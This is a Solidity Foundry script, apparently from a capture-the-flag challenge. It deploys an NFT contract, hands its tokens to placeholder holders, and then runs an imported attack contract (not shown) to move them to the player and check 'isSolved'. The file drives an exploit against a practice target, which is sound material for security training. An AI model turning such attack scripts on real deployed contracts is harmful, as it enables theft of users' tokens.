// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {ueAttack} from "src/uecallnft/ueAttack.sol";
import "forge-std/Script.sol";
import "targets/uecallnft/src/UECallNft.sol";
import "targets/uecallnft/src/Challenge.sol";

// Was: setup done outside broadcast — NFT contract only existed in simulation, not on-chain.
// Fix: SetupHelper contract deploys inside broadcast so everything lands on-chain.
contract SetupHelper {
    function setup() external payable returns (UECallNft) {
        UECallNft nftContract = new UECallNft();
        nftContract.mintUEC{value: 0.01 ether}();
        nftContract.mintUEC{value: 0.01 ether}();
        nftContract.mintUEC{value: 0.01 ether}();
        nftContract.mintUEC{value: 0.01 ether}();
        nftContract.mintUEC{value: 0.01 ether}();

        nftContract.transferFrom(address(this), address(0x2222222), 1);
        nftContract.transferFrom(address(this), address(0x3333333), 2);
        nftContract.transferFrom(address(this), address(0x4444444), 3);
        nftContract.transferFrom(address(this), address(0x5555555), 4);
        nftContract.transferFrom(address(this), address(0x6666666), 5);

        return nftContract;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract Attack is Script {
    function run() external {
        address player = vm.envAddress("PLAYER");
        vm.startBroadcast();

        // Setup: helper contract deploys NFT and distributes to random holders (not player)
        SetupHelper helper = new SetupHelper();
        UECallNft nftContract = helper.setup{value: 0.05 ether}();

        Challenge challenge = new Challenge(player, nftContract);

        //// Attack
        ueAttack attack = new ueAttack(player, nftContract);
        attack.attack();
        attack.transferToPlayer();

        bool o = challenge.isSolved();
        console.log("isSolved:", o);
        vm.stopBroadcast();
    }
}
